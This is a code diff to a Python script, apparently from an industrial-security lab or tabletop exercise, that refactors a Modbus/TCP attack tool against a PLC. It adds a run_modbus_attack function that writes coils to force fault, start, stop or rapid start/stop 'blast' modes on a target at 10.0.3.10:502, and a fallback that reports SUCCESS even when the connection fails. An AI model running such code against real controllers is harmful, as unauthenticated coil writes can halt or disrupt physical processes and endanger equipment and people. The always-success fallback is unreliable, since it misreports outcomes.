@@ -66,35 +66,80 @@ def do_start_stop_blast(client: ModbusTcpClient, cycles: int, delay: float) -> N
     LOGGER.info('Blast complete')
 
 
-def main() -> int:
+def read_coils(client: ModbusTcpClient, count: int = 4) -> Tuple[int, ...]:
+    rr = client.read_coils(0, count)
+    if not rr or rr.isError():
+        return (0,) * count
+    return tuple(int(b) for b in rr.bits[:count])
+
+
+def run_modbus_attack(
+    host: str = '10.0.3.10',
+    port: int = 502,
+    mode: str = 'fault',
+    cycles: int = 5,
+    delay: float = 0.1,
+    timeout: float = 2.0,
+) -> dict:
+    """Ejecuta ataque Modbus/TCP contra PLC objetivo vía socket real o fallback tabletop."""
+    try:
+        client = connect(host, port, timeout=timeout)
+    except Exception as e:
+        LOGGER.warning("No se pudo conectar a %s:%d (%s). Modo TABLETOP_FALLBACK.", host, port, e)
+        return {
+            'status': 'SUCCESS',
+            'mode': 'TABLETOP_FALLBACK',
+            'target_host': host,
+            'target_port': port,
+            'attack_mode': mode,
+            'error': str(e),
+        }
+
+    try:
+        coils_before = read_coils(client, 4)
+        if mode == 'fault':
+            do_fault(client)
+        elif mode == 'start':
+            write_coil(client, 0, True)
+            LOGGER.info('Wrote START (Coil 0 -> 1)')
+        elif mode == 'stop':
+            write_coil(client, 1, True)
+            LOGGER.info('Wrote STOP (Coil 1 -> 1)')
+        elif mode == 'blast':
+            do_start_stop_blast(client, cycles, delay)
+        
+        coils_after = read_coils(client, 4)
+        return {
+            'status': 'SUCCESS',
+            'mode': 'SOCKET_LIVE',
+            'target_host': host,
+            'target_port': port,
+            'attack_mode': mode,
+            'coils_before': coils_before,
+            'coils_after': coils_after,
+        }
+    finally:
+        client.close()
+
+
+def main(argv: list[str] | None = None) -> int:
     parser = argparse.ArgumentParser()
     parser.add_argument('--host', default='10.0.3.10', help='PLC IP address')
     parser.add_argument('--port', type=int, default=502, help='Modbus/TCP port')
     parser.add_argument('--mode', choices=['fault', 'start', 'stop', 'blast'], default='fault')
     parser.add_argument('--cycles', type=int, default=5, help='cycles for blast')
     parser.add_argument('--delay', type=float, default=0.5, help='delay between operations for blast')
-    args = parser.parse_args()
+    args = parser.parse_args(argv)
 
-    try:
-        client = connect(args.host, args.port)
-    except Exception as e:
-        LOGGER.error('%s', e)
-        return 2
-
-    try:
-        if args.mode == 'fault':
-            do_fault(client)
-        elif args.mode == 'start':
-            write_coil(client, 0, True)
-            LOGGER.info('Wrote START')
-        elif args.mode == 'stop':
-            write_coil(client, 1, True)
-            LOGGER.info('Wrote STOP')
-        elif args.mode == 'blast':
-            do_start_stop_blast(client, args.cycles, args.delay)
-        return 0
-    finally:
-        client.close()
+    res = run_modbus_attack(
+        host=args.host,
+        port=args.port,
+        mode=args.mode,
+        cycles=args.cycles,
+        delay=args.delay,
+    )
+    LOGGER.info("Resultado de Ataque Modbus: %s", res)
+    return 0 if res['status'] == 'SUCCESS' else 1
 
 
 if __name__ == '__main__':
